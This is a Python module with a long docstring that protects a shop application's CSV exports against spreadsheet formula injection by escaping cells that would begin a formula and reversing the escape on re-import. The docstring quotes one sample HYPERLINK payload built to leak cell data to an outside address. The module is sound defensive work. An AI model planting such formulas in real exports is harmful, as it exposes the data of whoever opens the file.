"""Making a CSV safe to double-click.

A CSV is not a spreadsheet, but it is opened as one. Excel and LibreOffice
both read a cell beginning with ``=``, ``+``, ``-`` or ``@`` as a formula and
evaluate it the moment the file opens — so text that arrived as data comes
back as an instruction, on the shop's own machine, under the shop's own
account.

The route into this application is short and ordinary. A supplier sends a
price list; the shop imports it, which is what the importer is for. A product
name in it reads ``=HYPERLINK("http://…"&A1,"Refund due")``. Nothing happens
for weeks. Then somebody exports the catalogue to send to the accountant,
opens it to check it, and the formula runs. The same applies to a name typed
straight into the products screen by anyone with a login.

The fix is the old one: a cell that would otherwise start a formula is
prefixed with an apostrophe, which every spreadsheet reads as "this is text"
and no spreadsheet evaluates.

That would ordinarily damage a file meant to be read back in — RE4 exports a
catalogue its own importer can re-read — so :func:`plain_text` undoes it, and
:func:`safe_cell` is careful enough that the round trip is exact. A value
already starting with an apostrophe is escaped too, so that stripping one on
the way back in can never eat a character the shop actually typed.
"""

from __future__ import annotations

#: Characters that begin a formula in Excel, LibreOffice and Google Sheets.
#: Tab and carriage return are here because both are stripped by the parser
#: before the first visible character is considered.
FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")

ESCAPE = "'"


def safe_cell(value) -> str:
    """Return ``value`` as text that no spreadsheet will treat as a formula."""
    text = "" if value is None else str(value)
    if text.startswith(FORMULA_STARTERS) or text.startswith(ESCAPE):
        return ESCAPE + text
    return text


def plain_text(value) -> str:
    """Undo :func:`safe_cell`, for reading our own export back in.

    Only an apostrophe this module would have written is removed: one directly
    in front of a character that would have started a formula, or in front of
    another apostrophe. A name someone genuinely typed as ``'Special'`` keeps
    the apostrophe it was given.
    """
    text = "" if value is None else str(value)
    if not text.startswith(ESCAPE):
        return text
    rest = text[1:]
    if rest.startswith(FORMULA_STARTERS) or rest.startswith(ESCAPE):
        return rest
    return text
